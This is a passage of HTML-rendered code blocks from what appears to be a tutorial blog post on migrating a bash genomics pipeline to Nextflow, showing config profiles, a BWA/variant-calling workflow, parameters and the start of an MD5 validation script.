class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">GB </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        time </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">h </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">profiles </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    docker </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        docker</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">enabled </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    singularity </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        singularity</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">enabled </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    standard </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        process</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">executor </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'local'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// main.nf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> BWA_ALIGN </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/bwa_align'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> MARK_DUPLICATES </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/mark_duplicates'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> CALL_VARIANTS </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/call_variants'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">workflow </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Input channel</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input_samples </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Channel</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">fromPath</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">input_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/*.fastq'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">map </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> file </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> meta </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">id</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">baseName</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token function" style="color:hsl(221, 87%, 60%)">tuple</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Reference files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    reference </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    reference_index </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">reference </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'.bwt'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Run pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">BWA_ALIGN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_samples</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> reference_index</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">MARK_DUPLICATES</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">BWA_ALIGN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">CALL_VARIANTS</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">MARK_DUPLICATES</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># params.yaml</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">input_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./data/reads'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./data/reference/hg38.fasta'</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-validate-with-md5-comparison">Step 3: Validate with MD5 Comparison<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#step-3-validate-with-md5-comparison" class="hash-link" aria-label="Direct link to Step 3: Validate with MD5 Comparison" title="Direct link to Step 3: Validate with MD5 Comparison" translate="no">​</a></h2>
<p>After running the Nextflow pipeline, systematically compare outputs with the baseline.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="31-create-a-validation-script">3.1 Create a Validation Script<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#31-create-a-validation-script" class="hash-link" aria-label="Direct link to 3.1 Create a Validation Script" title="Direct link to 3.1 Create a Validation Script" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># validate_migration.sh - Compare Nextflow outputs with bash baseline</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-euo</span><span class="token plain"> pipefail</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE_DIR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/baseline"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NEXTFLOW_DIR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/nextflow"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">VALIDATION_REPORT</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/validation_report.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Pipeline Migration Validation Report ==="</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Generated: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">date</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-Iseconds</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Function to compare checksums</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function-name function" style="color:hsl(221, 87%, 60%)">compare_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">filename</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">baseline</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${BASELINE_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${filename}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">migrated</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${NEXTFLOW_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${filename}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$baseline</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"BASELINE MISSING: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$filename</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">return</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$migrated</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"MIGRATED MISSING: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$filename</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">return</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">baseline_md5</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">md5sum </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$baseline</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">migrated_md5</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">md5sum </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$migrated</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$baseline_md5</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$migrated_md5</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"PASS: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$filename</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"   MD5: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$baseline_md5</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">return</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"FAIL: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$filename</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"   Baseline MD5: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$baseline_md5</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"   Migrated MD5: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$migrated_md5</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 